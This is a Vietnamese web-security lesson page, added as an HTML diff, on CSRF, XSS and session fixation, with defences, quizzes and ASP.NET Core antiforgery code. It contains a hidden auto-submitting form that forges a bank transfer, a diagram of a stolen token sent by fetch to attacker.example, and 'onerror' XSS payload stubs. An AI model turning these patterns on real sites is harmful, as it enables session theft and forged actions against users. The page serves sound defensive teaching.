@@ -1,0 +1,287 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>M06 · Bài 6.3 · CSRF, XSS &amp; session fixation</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<main class="content">
+
+<div class="page-head">
+  <div class="breadcrumb"><a href="index.html">Lộ trình</a> / <a href="m06-authz-security.html">Module 06</a> / Bài 6.3</div>
+  <h1>Bài 6.3 — CSRF, XSS &amp; session fixation</h1>
+  <p class="lead">Bài này mở đầu bằng “bản đồ” các tấn công phổ biến, rồi đi sâu vào ba tấn công web kinh điển nhắm vào cookie và session: CSRF (mượn tay trình duyệt gửi request), XSS (chèn script vào trang) và session fixation (cài sẵn phiên cho nạn nhân) — cơ chế của từng cái và cách chặn.</p>
+  <div class="meta-row">
+    <span class="chip">⏱ ~25 phút</span>
+    <span class="chip">📘 <a href="m06-authz-security.html">Module 06 · Authorization &amp; Auth Security</a></span>
+  </div>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="threats">C. Threats và rủi ro phổ biến <span class="badge must">Must</span></h2>
+<p>Mục tiêu là <b>nhận diện rủi ro và thiết kế phòng vệ</b>, không phải thực hành tấn công.</p>
+
+<div class="terms"><span class="terms-title">📖 Thuật ngữ trong bài</span><dl>
+<dt>Origin / site</dt><dd>Origin = scheme + host + port (<code>https://hr.kaopiz.com</code>). Site rộng hơn: chỉ xét scheme + tên miền đăng ký (<code>kaopiz.com</code>), nên <code>a.kaopiz.com</code> và <code>b.kaopiz.com</code> là cùng site.</dd>
+<dt>CSRF</dt><dd>Trang độc dụ trình duyệt của bạn gửi request tới app bạn đang đăng nhập, cookie tự đi kèm.</dd>
+<dt>XSS</dt><dd>Script của kẻ gian lọt vào và <b>chạy bên trong</b> trang của app bạn.</dd>
+<dt>SameSite</dt><dd>Thuộc tính cookie quyết định cookie có được gửi kèm request xuất phát từ site khác hay không.</dd>
+<dt>CSP</dt><dd>Content Security Policy: header HTTP khai báo trình duyệt được chạy script từ đâu.</dd>
+<dt>Session fixation / hijacking</dt><dd>Cài sẵn session ID cho nạn nhân trước khi họ login / lấy trộm session ID sau khi họ login.</dd>
+<dt>MITM / AiTM</dt><dd>Kẻ đứng giữa nghe lén đường truyền / trang phishing đứng giữa người dùng và trang login thật.</dd>
+<dt>Rate limit / throttling</dt><dd>Giới hạn số request trong một khoảng thời gian.</dd>
+<dt>Sender-constrained token</dt><dd>Token gắn với khóa của client (<b>DPoP</b> — RFC 9449, hoặc mTLS — RFC 8705): bị lấy cắp cũng không dùng được nếu thiếu khóa.</dd>
+<dt>SIM swap</dt><dd>Kẻ gian thuyết phục nhà mạng chuyển số điện thoại của nạn nhân sang SIM mới của chúng.</dd>
+</dl></div>
+
+<p>Bảng dưới là <b>bản đồ tổng quan</b>: mỗi dòng một kiểu tấn công, kẻ gian muốn gì, dấu hiệu nhận biết và cách chặn chính. Lần đầu chỉ cần đọc lướt cột “Mục tiêu”; các tấn công quan trọng nhất có link “chi tiết” sang phần giải thích riêng.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>Threat</th><th>Mục tiêu / cách làm</th><th>Dấu hiệu</th><th>Phòng vệ chính</th></tr></thead>
+<tbody>
+<tr><td><b>Brute force</b></td><td>Thử nhiều mật khẩu cho một account.</td><td>Nhiều lần sai liên tiếp cho cùng username.</td><td>Rate limit/throttling, khóa tạm hoặc risk control (CAPTCHA, chặn IP), MFA.</td></tr>
+<tr><td><b>Credential stuffing</b></td><td>Dùng cặp email/mật khẩu bị lộ từ dịch vụ khác.</td><td>Đăng nhập từ nhiều account, cùng IP/ASN, tỉ lệ thành công thấp nhưng đều.</td><td>MFA/passkey, phát hiện bất thường, kiểm tra mật khẩu với danh sách đã lộ (blocklist).</td></tr>
+<tr><td><b>Phishing</b></td><td>Lừa người dùng nhập credential/OTP vào trang giả.</td><td>Đăng nhập từ vị trí/thiết bị lạ ngay sau email đáng ngờ.</td><td>Phishing-resistant MFA (FIDO2/passkey), đào tạo, lọc email.</td></tr>
+<tr><td><b>Replay attack</b></td><td>Phát lại thông điệp/credential/token đã bắt được.</td><td>Cùng assertion/nonce dùng nhiều lần.</td><td><code>nonce</code>/challenge, timestamp, lifetime ngắn, lưu ID đã dùng (vd SAML <code>InResponseTo</code>, JWT <code>jti</code>), sender-constrained token (DPoP/mTLS).</td></tr>
+<tr><td><b>Session hijacking</b></td><td>Lấy session cookie/ID để mạo danh.</td><td>Cùng session từ IP/UA khác nhau.</td><td>Cookie <code>Secure</code>/<code>HttpOnly</code>/<code>SameSite</code>, TLS, chống XSS, rotate session ID sau login/đổi quyền, timeout.</td></tr>
+<tr><td><b>CSRF</b> (<a href="#csrf">chi tiết</a>)</td><td>Lợi dụng browser tự gửi cookie để thực hiện hành động thay nạn nhân.</td><td>Request thay đổi trạng thái với <code>Origin</code> lạ.</td><td><code>SameSite</code>, anti-CSRF token, kiểm tra <code>Origin</code>/<code>Referer</code>.</td></tr>
+<tr><td><b>XSS</b> (<a href="#xss">chi tiết</a>)</td><td>Chạy script độc trong origin của app.</td><td>Request ra domain lạ, CSP violation report.</td><td>Output encoding, CSP, sanitization, không để token ở nơi JS dễ đọc.</td></tr>
+<tr><td><b>Token theft / leakage</b></td><td>Lấy token qua log, URL, storage, telemetry, crash dump.</td><td>Token dùng từ nơi khác; token xuất hiện trong log.</td><td>Không log token, không đưa token vào URL, lifetime ngắn, secure storage, TLS, sender-constrained token.</td></tr>
+<tr><td><b>MITM</b></td><td>Nghe lén/sửa đường truyền.</td><td>Cảnh báo certificate, downgrade HTTP.</td><td>TLS đúng cấu hình, kiểm tra certificate (không tắt validation), HSTS.</td></tr>
+<tr><td><b>Open redirect / redirect URI abuse</b></td><td>Đưa authorization code/token tới endpoint của kẻ tấn công.</td><td><code>redirect_uri</code> lạ trong log của IdP.</td><td>Allowlist <code>redirect_uri</code> <b>khớp chính xác</b>, không wildcard, PKCE (<a href="m03-4-state-nonce-redirect.html#redirect-uri">M03</a>).</td></tr>
+<tr><td><b>JWT alg/key confusion</b> (<a href="m06-4-identity-attacks.html#jwt-confusion">chi tiết</a>)</td><td>Giả token bằng <code>alg: none</code> hoặc ký HS256 bằng public key.</td><td>Token với <code>alg</code> bất thường.</td><td>Allowlist thuật toán, khóa gắn với thuật toán, dùng thư viện chuẩn (<a href="m02-3-token-jwt.html#jwt-validation">M02</a>).</td></tr>
+<tr><td><b>Account enumeration</b></td><td>Biết email nào có tài khoản (để phishing/stuffing).</td><td>Nhiều request login/reset với email khác nhau.</td><td>Thông báo lỗi chung (“email hoặc mật khẩu không đúng”), thời gian phản hồi đồng đều, rate limit.</td></tr>
+<tr><td><b>Recovery flow weakness</b></td><td>Đi đường vòng qua “quên mật khẩu” yếu hơn login.</td><td>Nhiều yêu cầu reset, đổi email/điện thoại ngay sau reset.</td><td>Recovery mạnh ngang login, link reset dùng 1 lần + hết hạn nhanh, thông báo cho user, không dùng câu hỏi bảo mật.</td></tr>
+<tr><td><b>Session fixation</b> (<a href="#session-fixation">chi tiết</a>)</td><td>Cài sẵn session ID cho nạn nhân trước khi họ đăng nhập.</td><td>Session ID không đổi trước/sau login.</td><td>Cấp session ID mới sau login, không nhận session ID từ URL.</td></tr>
+<tr><td><b>SIM swap / chặn SMS</b></td><td>Chiếm số điện thoại để nhận OTP.</td><td>User báo mất sóng, OTP gửi tới SIM mới.</td><td>SMS OTP chỉ là phương án dự phòng; ưu tiên app/passkey.</td></tr>
+<tr><td><b>MFA fatigue</b> (<a href="m06-4-identity-attacks.html#mfa-fatigue">chi tiết</a>)</td><td>Spam push tới khi người dùng bấm “Chấp nhận”.</td><td>Nhiều push bị từ chối liên tiếp.</td><td>Number matching, hiển thị ngữ cảnh, giới hạn số push, báo cáo “không phải tôi”.</td></tr>
+<tr><td><b>AiTM phishing</b> (<a href="m06-4-identity-attacks.html#aitm">chi tiết</a>)</td><td>Reverse proxy chuyển tiếp login thật, lấy session cookie <i>sau</i> MFA.</td><td>Session dùng từ IP khác ngay sau login; domain lạ.</td><td>FIDO2/passkey, conditional access, ràng buộc session với thiết bị, phát hiện bất thường.</td></tr>
+</tbody></table></div>
+
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Dùng HTTPS là chống được phần lớn các tấn công trong bảng.</span><span class="f-label">Thực tế</span><span>TLS chỉ bảo vệ <b>đường truyền</b> (MITM, nghe lén). CSRF, XSS, BOLA, credential stuffing, phishing đều diễn ra trên kết nối HTTPS hoàn toàn hợp lệ — trang AiTM còn có chứng chỉ TLS thật cho domain của nó.</span></div>
+
+<h3 id="csrf">C.1. CSRF — Cross-Site Request Forgery</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+CSRF (giả mạo request liên trang) giống việc kẻ gian <b>gửi một lá thư đã điền sẵn</b> “chuyển 10 triệu cho X” vào hộp thư công ty bạn, và nhân viên bưu điện tự động <b>đóng dấu của bạn</b> lên mọi thư gửi tới ngân hàng của bạn. Kẻ gian không cần biết con dấu (cookie) trông thế nào — chỉ cần lợi dụng việc nó được đóng tự động.</div>
+<p>Browser <b>tự động gửi cookie</b> của site A khi có request tới site A — kể cả khi request đó được khởi tạo từ trang của kẻ tấn công. Nếu app chỉ dựa vào cookie để xác thực, kẻ tấn công có thể khiến nạn nhân thực hiện hành động mà không biết.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant V as Nạn nhân (Browser)
+  participant Bank as bank.example (đã đăng nhập)
+  participant Evil as evil.example
+  V->>Bank: Đăng nhập, nhận cookie session=abc
+  Note over V: Vẫn đang đăng nhập, mở tab khác
+  V->>Evil: Mở trang evil.example
+  Evil-->>V: HTML có form ẩn tự submit
+  V->>Bank: POST /transfer to=hacker, 10tr
+  Note over V,Bank: Browser tự gắn Cookie session=abc
+  Note over Bank: Cookie hợp lệ → server tưởng nạn nhân tự chuyển tiền
+  Bank-->>V: 200 OK ❌
+</pre>
+<div class="caption">CSRF: kẻ tấn công không đọc được cookie, chỉ “mượn” việc browser tự gửi cookie.</div>
+</div>
+<pre data-title="Trang evil.example (minh họa)"><code class="language-xml">&lt;form action="https://bank.example/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="hacker"&gt;
+  &lt;input type="hidden" name="amount" value="10000000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</code></pre>
+
+<div class="table-wrap"><table>
+<thead><tr><th>Giá trị <code>SameSite</code></th><th>Cookie được gửi trong request cross-site?</th><th>Ghi chú</th></tr></thead>
+<tbody>
+<tr><td><code>Strict</code></td><td>Không gửi trong mọi request cross-site (kể cả bấm link từ site khác).</td><td>An toàn nhất nhưng user bấm link từ email sẽ thấy như “chưa đăng nhập”.</td></tr>
+<tr><td><code>Lax</code></td><td>Chỉ gửi khi điều hướng top-level bằng method an toàn (GET bấm link); không gửi với POST form, fetch, iframe cross-site.</td><td>Cân bằng tốt. Trình duyệt Chromium mặc định coi cookie không khai báo <code>SameSite</code> là <code>Lax</code>; đừng dựa vào mặc định — khai báo rõ.</td></tr>
+<tr><td><code>None</code></td><td>Gửi trong mọi request (bắt buộc kèm <code>Secure</code>).</td><td>Cần cho kịch bản cross-site thật (embed, một số flow SSO) → phải có chống CSRF khác.</td></tr>
+</tbody></table></div>
+<div class="callout warn"><span class="callout-title">⚠️ SameSite không phải là tất cả</span>
+“Site” = scheme + registrable domain (vd <code>example.com</code>). <code>evil.example.com</code> (subdomain bị chiếm) là <b>same-site</b> với <code>app.example.com</code> → SameSite không chặn. Vì vậy vẫn nên kết hợp <b>anti-CSRF token</b> hoặc kiểm tra <code>Origin</code>, đặc biệt cho request thay đổi trạng thái. Và GET <b>không được</b> thay đổi trạng thái.</div>
+<p><b>Phòng vệ nhiều lớp</b> — dùng kết hợp, không chọn một:</p>
+<ol>
+<li>Cookie <code>SameSite=Lax</code> hoặc <code>Strict</code>.</li>
+<li><b>Anti-forgery token</b> (mã chống giả mạo): một giá trị ngẫu nhiên app nhúng vào form/header (kiểu synchronizer token hoặc double-submit). Trang của kẻ tấn công không đọc được giá trị này nên không gửi kèm được.</li>
+<li>Kiểm tra header <code>Origin</code>/<code>Referer</code>: request thay đổi dữ liệu mà đến từ origin lạ → từ chối.</li>
+<li>Với SPA/BFF: yêu cầu một custom header (vd <code>X-CSRF: 1</code>). Trình duyệt không cho trang cross-site gửi custom header nếu không qua CORS preflight (bước trình duyệt hỏi server “có cho phép không?” trước khi gửi).</li>
+</ol>
+<p>Đoạn code dưới cấu hình cookie an toàn và bật kiểm tra anti-forgery cho mọi request thay đổi dữ liệu (POST/PUT/PATCH/DELETE):</p>
+<pre data-title="Program.cs — antiforgery cho BFF/SPA gọi JSON API"><code class="language-csharp">builder.Services.AddAntiforgery(o =&gt; o.HeaderName = "X-XSRF-TOKEN");
+
+builder.Services.AddAuthentication().AddCookie(o =&gt;
+{
+    o.Cookie.Name = "__Host-app";                        // __Host-: Secure, Path=/, không Domain
+    o.Cookie.HttpOnly = true;
+    o.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+    o.Cookie.SameSite = SameSiteMode.Lax;
+});
+
+var app = builder.Build();
+app.UseAuthentication();
+app.UseAntiforgery();   // .NET 8+: tự kiểm tra endpoint nhận form
+
+// Với JSON API, gọi kiểm tra tường minh cho các method thay đổi trạng thái:
+app.Use(async (ctx, next) =&gt;
+{
+    if (HttpMethods.IsPost(ctx.Request.Method) || HttpMethods.IsPut(ctx.Request.Method)
+        || HttpMethods.IsDelete(ctx.Request.Method) || HttpMethods.IsPatch(ctx.Request.Method))
+    {
+        var af = ctx.RequestServices.GetRequiredService&lt;IAntiforgery&gt;();
+        await af.ValidateRequestAsync(ctx);   // ném AntiforgeryValidationException nếu sai
+    }
+    await next();
+});</code></pre>
+<div class="callout info"><span class="callout-title">ℹ️ API chỉ dùng Bearer token có bị CSRF không?</span>
+Không theo cách cổ điển: browser <b>không tự</b> gắn header <code>Authorization</code>; JavaScript của bạn phải gắn. CSRF là vấn đề của <b>credential tự động gửi</b> (cookie, Basic auth đã lưu, Windows Integrated Auth). Đổi lại, token mà JS đọc được lại nhạy cảm với <a href="#xss">XSS</a> — xem <a href="m06-5-password-token-storage.html#token-storage">token storage</a>.</div>
+
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Đã đặt <code>SameSite=Lax</code> thì không cần biện pháp chống CSRF nào khác.</span><span class="f-label">Thực tế</span><span>SameSite không chặn subdomain bị chiếm (cùng site); <code>Lax</code> vẫn gửi cookie khi bấm link GET — nên GET thay đổi trạng thái vẫn bị lợi dụng; cookie <code>SameSite=None</code> cho SSO/embed thì không được bảo vệ. Kết hợp anti-CSRF token hoặc kiểm tra <code>Origin</code>.</span></div>
+
+<h3 id="xss">C.2. XSS — Cross-Site Scripting</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+XSS (chèn script liên trang) giống việc kẻ gian <b>trà trộn vào làm nhân viên</b> bên trong công ty bạn: hắn đọc được mọi giấy tờ trên bàn (localStorage), dùng điện thoại nội bộ gọi đi như người nhà (gọi API). Khóa két (HttpOnly) giúp hắn không mang được chìa đi, nhưng khi còn ở trong tòa nhà, hắn vẫn sai khiến được nhiều thứ.</div>
+<p>XSS xảy ra khi dữ liệu không tin cậy được chèn vào trang mà không encode, khiến script của kẻ tấn công chạy <b>trong origin của app</b>, với toàn bộ quyền của app: đọc DOM, đọc <code>localStorage</code>, gọi API.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant H as Kẻ tấn công
+  participant App as SPA (app.example)
+  participant V as Browser nạn nhân
+  participant X as attacker.example
+  H->>App: Gửi bình luận chứa thẻ img onerror=script
+  V->>App: Mở trang có bình luận
+  App-->>V: HTML render bình luận KHÔNG encode
+  Note over V: Script chạy trong origin app.example
+  V->>V: Đọc token trong localStorage
+  V->>X: fetch(attacker.example/c?t=eyJ...)
+  Note over H,X: Kẻ tấn công dùng token từ máy khác,<br/>kể cả khi nạn nhân đã đóng tab
+</pre>
+<div class="caption">Token trong localStorage bị lấy đi và dùng lâu dài (đặc biệt nguy hiểm nếu là refresh token).</div>
+</div>
+<p>Sơ đồ trên là <b>stored XSS</b>. Script độc có thể lọt vào trang theo ba đường khác nhau:</p>
+<div class="compare"><span class="compare-title">Phân biệt dễ nhầm: Stored vs Reflected vs DOM-based XSS</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Stored XSS</th><th>Reflected XSS</th><th>DOM-based XSS</th></tr></thead>
+<tbody>
+<tr><td>Payload nằm ở đâu</td><td>Được <b>lưu</b> trong DB (bình luận, hồ sơ, tên file…)</td><td>Nằm trong <b>request</b> (thường là URL), server “phản chiếu” lại vào HTML</td><td>Nằm trong URL/fragment hoặc dữ liệu phía client; <b>JS của trang</b> tự chèn vào DOM</td></tr>
+<tr><td>Ai trúng</td><td>Mọi người mở trang có dữ liệu đó</td><td>Người bấm vào link độc</td><td>Người bấm vào link độc</td></tr>
+<tr><td>Server có thấy payload?</td><td>Có</td><td>Có</td><td>Có thể không (vd payload sau dấu <code>#</code> không được gửi lên server)</td></tr>
+<tr><td>Sửa ở đâu</td><td>Encode khi <b>hiển thị</b> (server/template)</td><td>Encode khi <b>hiển thị</b> (server/template)</td><td>Code JavaScript phía client: dùng <code>textContent</code> thay vì <code>innerHTML</code></td></tr>
+</tbody></table></div>
+<p><b>Ví dụ (Kaopiz HR):</b> An đặt “Ghi chú nghỉ phép” là <code>&lt;img src=x onerror=...&gt;</code>; khi Bình mở trang duyệt, script chạy trong trình duyệt Bình → <b>stored</b>. Trang tìm kiếm <code>/search?q=...</code> in thẳng <code>q</code> ra HTML → <b>reflected</b>. Trang <code>hr-web</code> đọc <code>location.hash</code> rồi gán vào <code>innerHTML</code> để hiện lời chào → <b>DOM-based</b>.</p>
+<span class="rule">Stored: nằm chờ trong DB. Reflected: dội lại từ URL qua server. DOM: JS phía client tự gây ra. Cả ba cùng một hậu quả — script chạy trong origin của bạn.</span>
+</div>
+<div class="dodont">
+<div class="do"><h5>✅ Ngăn XSS từ gốc</h5><ul><li>Output encoding theo ngữ cảnh (Razor, React mặc định encode).</li><li>Tránh <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>@Html.Raw</code> với dữ liệu người dùng; nếu bắt buộc → sanitize bằng thư viện chuẩn.</li><li>Content-Security-Policy chặn inline script và domain lạ.</li><li>Kiểm soát thư viện bên thứ ba (supply chain, Subresource Integrity).</li></ul></div>
+<div class="dont"><h5>❌ Sai lầm thường gặp</h5><ul><li>Nghĩ “dùng cookie HttpOnly là hết lo XSS” — script vẫn gọi API <i>từ chính browser nạn nhân</i>.</li><li>Lưu refresh token dài hạn trong <code>localStorage</code>.</li><li>Tự viết regex để lọc thẻ <code>&lt;script&gt;</code>.</li></ul></div>
+</div>
+<div class="compare" id="csrf-vs-xss"><span class="compare-title">Phân biệt dễ nhầm: CSRF vs XSS — ai chạy code ở đâu, chặn bằng gì</span>
+<div class="table-wrap"><table>
+<thead><tr><th></th><th>CSRF</th><th>XSS</th></tr></thead>
+<tbody>
+<tr><td>Code của kẻ tấn công chạy ở đâu?</td><td>Trên site <b>khác</b> (evil.example)</td><td><b>Trong</b> origin của app</td></tr>
+<tr><td>Đọc được dữ liệu/response?</td><td>Không (chỉ gửi request “mù”)</td><td>Có — đọc DOM, storage, response</td></tr>
+<tr><td>Lợi dụng</td><td>Browser tự gửi cookie</td><td>Lỗi encode/sanitize</td></tr>
+<tr><td>Phòng vệ</td><td>SameSite, anti-CSRF token, Origin check</td><td>Encoding, CSP, sanitization</td></tr>
+<tr><td>Quan hệ</td><td colspan="2">XSS <b>phá được</b> mọi chống CSRF (script đọc được anti-CSRF token). Chống CSRF không giúp gì với XSS.</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Với CSRF, Bình đang đăng nhập <code>hr-web</code> rồi mở <code>evil.example</code>; trang đó gửi một form “duyệt nghỉ phép” sang <code>hr-web</code>, nhưng <b>không đọc được</b> kết quả trả về. Với XSS, script nằm <b>ngay trong</b> trang <code>hr-web</code>: nó tự đọc anti-CSRF token trên trang, gọi API duyệt, rồi đọc luôn bảng lương gửi ra ngoài.</p>
+<span class="rule">CSRF: kẻ gian ở ngoài “mượn tay” trình duyệt. XSS: kẻ gian đã ở trong nhà. Chặn XSS trước, vì XSS làm vô hiệu chống CSRF.</span>
+</div>
+
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Cookie HttpOnly chống được XSS.</span><span class="f-label">Thực tế</span><span>HttpOnly chỉ ngăn JS <b>đọc</b> cookie; script vẫn gửi request kèm cookie từ browser nạn nhân, đọc DOM và gọi API như người dùng.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>App đã có anti-CSRF token thì cũng được bảo vệ trước XSS.</span><span class="f-label">Thực tế</span><span>Anti-CSRF token chỉ chặn request khởi tạo từ site <b>khác</b>. Script XSS chạy <b>trong</b> origin của app, đọc được token trên trang và gửi kèm như code thật.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Dùng React/Razor tự encode nên app không thể dính XSS.</span><span class="f-label">Thực tế</span><span>Encode mặc định chỉ bảo vệ khi bạn không “vượt rào”: <code>dangerouslySetInnerHTML</code>, <code>@Html.Raw</code>, gán <code>innerHTML</code> trong JS thuần, hay một thư viện bên thứ ba bị nhiễm đều mở lại cửa cho XSS.</span></div>
+
+<h3 id="session-fixation">C.3. Session fixation</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Kẻ gian <b>đưa sẵn cho bạn một tấm thẻ phòng khách sạn</b> mà hắn giữ bản sao, rồi dụ bạn ra lễ tân “kích hoạt” thẻ đó. Nếu lễ tân kích hoạt luôn tấm cũ thay vì <b>phát thẻ mới</b>, hắn cũng mở được phòng bạn.</div>
+<p>Kẻ tấn công khiến nạn nhân dùng một session ID <b>do kẻ tấn công biết trước</b>. Nếu sau khi nạn nhân đăng nhập, server vẫn giữ nguyên ID đó và gắn danh tính vào → kẻ tấn công dùng cùng ID là vào được tài khoản.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+  participant H as Kẻ tấn công
+  participant V as Nạn nhân
+  participant S as Web app
+  H->>S: Mở trang, nhận SESSIONID=X (chưa đăng nhập)
+  H->>V: Gửi link chứa SESSIONID=X
+  Note over H,V: Hoặc cài cookie qua subdomain bị chiếm
+  V->>S: Đăng nhập với SESSIONID=X
+  alt App lỗi: giữ nguyên ID
+    S-->>V: OK, session X giờ là của nạn nhân
+    H->>S: Dùng SESSIONID=X → vào tài khoản ❌
+  else App đúng: cấp ID mới sau login
+    S-->>V: Set-Cookie SESSIONID=Y (X bị hủy)
+    H->>S: Request với SESSIONID=X → chưa đăng nhập ✅
+  end
+</pre>
+</div>
+<p><b>Phòng vệ:</b> luôn cấp session ID mới sau login và khi thay đổi đặc quyền (vd vào chế độ admin), không chấp nhận session ID qua URL, dùng tiền tố cookie <code>__Host-</code> để subdomain không ghi đè cookie. Với ASP.NET Core cookie authentication, <code>SignInAsync</code> phát hành cookie xác thực mới; nhưng nếu bạn dùng thêm <code>ISession</code> để lưu dữ liệu nhạy cảm, hãy tự xóa/đổi session sau đăng nhập (xem <a href="m02-2-session-cookie.html#session-management">session management</a>).</p>
+
+<div class="compare"><span class="compare-title">Phân biệt dễ nhầm: Session fixation vs Session hijacking</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Session fixation</th><th>Session hijacking</th></tr></thead>
+<tbody>
+<tr><td>Kẻ gian có session ID từ khi nào</td><td><b>Trước</b> khi nạn nhân đăng nhập — chính hắn tạo ra và “cài” cho nạn nhân</td><td><b>Sau</b> khi nạn nhân đăng nhập — lấy trộm ID đang dùng</td></tr>
+<tr><td>Cách lấy</td><td>Link chứa session ID, cookie ghi đè từ subdomain bị chiếm</td><td>XSS đọc cookie (nếu thiếu <code>HttpOnly</code>), nghe lén khi không có TLS, malware, AiTM proxy, log</td></tr>
+<tr><td>Lỗi của app</td><td>Không đổi session ID sau login</td><td>Cookie thiếu <code>Secure</code>/<code>HttpOnly</code>, có XSS, session sống quá lâu</td></tr>
+<tr><td>Chặn chính</td><td>Cấp session ID <b>mới</b> sau login và khi tăng đặc quyền</td><td><code>HttpOnly</code> + <code>Secure</code> + TLS, chống XSS, timeout, ràng buộc session với thiết bị</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Kẻ gian gửi cho An link <code>hr.kaopiz.com/login?sid=X</code>, An đăng nhập và app giữ nguyên <code>X</code> → <b>fixation</b>. An đăng nhập bình thường, nhận <code>sid=Y</code>, rồi một script XSS đọc được <code>Y</code> do cookie thiếu <code>HttpOnly</code> → <b>hijacking</b>. Cả hai kết thúc giống nhau: kẻ gian dùng session của An.</p>
+<span class="rule">Fixation: “đưa chìa cho nạn nhân rồi chờ”. Hijacking: “giật chìa của nạn nhân”.</span>
+</div>
+
+<p class="myth-head">⚠️ Hiểu lầm hay gặp</p>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Session fixation chỉ xảy ra khi app nhận session ID qua URL.</span><span class="f-label">Thực tế</span><span>Subdomain bị chiếm có thể ghi cookie cho cả domain cha (<code>Domain=kaopiz.com</code>) để cài sẵn session ID. Vì vậy dùng tiền tố <code>__Host-</code> và luôn cấp ID mới sau login.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Session ID đủ dài và ngẫu nhiên thì không bị fixation.</span><span class="f-label">Thực tế</span><span>Kẻ gian không cần đoán ID — chính hắn tạo ra nó. Độ dài chỉ chống dò ID; chỉ việc đổi ID sau login mới chặn được fixation.</span></div>
+
+<div class="callout tip"><span class="callout-title">✅ Tự kiểm tra nhanh</span><ul>
+<li>API chỉ nhận <code>Authorization: Bearer</code> (không dùng cookie) có cần anti-CSRF token không? Vì sao?</li>
+<li>Cookie đã <code>HttpOnly</code>. Kẻ tấn công XSS còn làm được gì?</li>
+<li>Sau khi user đăng nhập, app nên làm gì với session ID cũ?</li>
+</ul></div>
+
+<h2 id="quiz-bai">Quiz nhanh — Bài 6.3</h2>
+<div id="quiz"></div>
+
+</main>
+<script>
+window.QUIZ = [
+  { q: "Cookie session của <code>https://hr.kaopiz.com</code> đặt <code>SameSite=Strict</code>. Subdomain <code>https://blog.kaopiz.com</code> bị chiếm và chứa form tự submit <code>POST https://hr.kaopiz.com/leave/123/approve</code>. Bình (đang đăng nhập hr) mở trang blog đó. Cookie session có được gửi kèm không?",
+    tricky: true,
+    options: ["Không — Strict chặn mọi request xuất phát từ trang khác", "Có — hai subdomain cùng scheme và cùng registrable domain <code>kaopiz.com</code> nên là same-site; SameSite không áp dụng", "Không — vì đây là request POST", "Có — nhưng chỉ khi cookie thiếu HttpOnly"],
+    answer: 1,
+    why: ["Strict chặn request <b>cross-site</b>, không phải cross-origin; hai subdomain này là same-site.", "SameSite so “site” (scheme + registrable domain), không so origin — nên cần thêm anti-CSRF token hoặc kiểm tra <code>Origin</code>.", "Chỉ Lax mới phân biệt method với request cross-site; request same-site thì cả Lax lẫn Strict đều gửi cookie cho POST.", "HttpOnly chỉ quyết định JS có đọc được cookie hay không, không ảnh hưởng việc browser gửi cookie."],
+    explain: "Bẫy: nhầm site với origin. Xem cảnh báo “SameSite không phải là tất cả” ở <a href='m06-3-web-threats.html#csrf'>C.1</a>." },
+  { q: "<code>hr-web</code> có đủ anti-CSRF token, cookie <code>HttpOnly</code> + <code>SameSite=Strict</code>. Nhưng ô “Ghi chú nghỉ phép” có lỗi stored XSS. Khi Bình mở trang duyệt, script độc làm được gì? (chọn nhiều)",
+    tricky: true,
+    options: ["Đọc anti-CSRF token trên trang và gửi request duyệt đơn như Bình", "Đọc cookie session bằng <code>document.cookie</code> rồi gửi ra ngoài", "Gọi API đọc bảng lương rồi gửi dữ liệu ra domain khác", "Không làm được gì vì đã có anti-CSRF token và SameSite"],
+    answer: [0, 2],
+    why: ["Script chạy trong origin của <code>hr-web</code> nên đọc DOM/token như code của app, và request của nó là same-origin.", "HttpOnly chặn đúng việc này — nhưng script không cần đọc cookie vì browser tự gửi cookie cho nó.", "Khác CSRF, XSS đọc được response, nên lấy được dữ liệu rồi gửi đi (trừ khi CSP chặn kết nối ra ngoài).", "Chống CSRF chỉ chặn request từ site khác; XSS đã ở trong nhà nên vượt qua cả hai."],
+    explain: "Bẫy: “đã chống CSRF” tạo cảm giác an toàn. XSS làm vô hiệu mọi biện pháp chống CSRF. Xem <a href='m06-3-web-threats.html#csrf-vs-xss'>CSRF vs XSS</a>." },
+  { q: "<code>hr-web</code> hiện lời chào bằng <code>el.innerHTML = location.hash.slice(1)</code>. Kẻ gian gửi link có payload <code>&lt;img src=x onerror=...&gt;</code> nằm sau dấu <code>#</code>. WAF phía server không ghi nhận gì bất thường. Phát biểu nào đúng?",
+    options: ["Đây là stored XSS, sửa bằng cách encode khi lưu DB", "Đây là reflected XSS, server phản chiếu payload vào HTML", "Đây là DOM-based XSS: phần sau <code>#</code> không gửi lên server, phải sửa JS phía client (vd dùng <code>textContent</code>)", "Không phải XSS vì server chưa từng nhận payload"],
+    answer: 2,
